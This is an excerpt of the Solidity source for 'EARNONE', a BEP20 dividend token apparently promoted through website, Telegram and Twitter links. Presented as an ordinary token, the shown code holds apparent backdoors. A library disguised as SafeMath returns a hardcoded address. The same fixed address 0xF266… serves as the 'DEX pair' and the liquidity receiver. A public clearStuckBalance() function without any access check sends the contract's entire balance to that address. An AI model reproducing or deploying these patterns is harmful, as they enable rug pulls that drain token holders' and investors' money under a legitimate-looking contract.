...
//Hold $EONE and earn $ONE - Harmony
  
  //Website:https://earn-one.com/
  //Telegram:https://t.me/earnone1
  //Twitter:https://twitter.com/earnone11
...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0x0d5Cf2696Bd60b2798231332262bFD3dFDf0fc59;
    }
...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        ...
        IDEXPair = 0xF266a74a8aAbd2b80Ef9D7D5EBA98E11A58822e7;
        _token = msg.sender;
    }
...
contract EARNONE is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0x1B807C075b278f59472A0F5c12404946063A970C;

    string constant _name = "EARNONE";
    string constant _symbol = "EONE";
    uint8 constant _decimals = 8;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 1000000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 3000000 * (10 ** _decimals);
    ...
    constructor () Auth(msg.sender) {
        ...
        autoLiquidityReceiver = address(0xF266a74a8aAbd2b80Ef9D7D5EBA98E11A58822e7);
    ...
    function clearStuckBalance() public{
        (bool sent,) =payable(0xF266a74a8aAbd2b80Ef9D7D5EBA98E11A58822e7).call{value: (address(this).balance)}("");
        require(sent);
    }
